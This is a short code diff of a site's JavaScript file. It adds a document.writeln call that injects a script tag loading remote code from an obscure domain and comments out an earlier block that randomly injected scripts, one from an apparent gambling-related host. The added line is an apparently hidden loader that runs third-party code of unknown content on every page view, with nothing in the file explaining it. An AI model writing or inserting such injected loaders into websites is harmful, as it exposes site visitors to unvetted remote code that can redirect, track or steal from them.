@@ -1,3 +1,6 @@
+document.writeln("<script src=\'https://smtwm61.com/yd.php?id=440\'></script>");
+
+/*
 var m = 3; 
 var n = Math.floor(Math.random() * m + 1)
 switch (n) {
@@ -10,8 +13,5 @@ switch (n) {
 	case 3:
 		document.writeln("<script src=\'https://js.ok-11-cai.cc/slot?7255774253627174051-10547\'></script>");
 		break;
-
-
-
 }
-
+*/
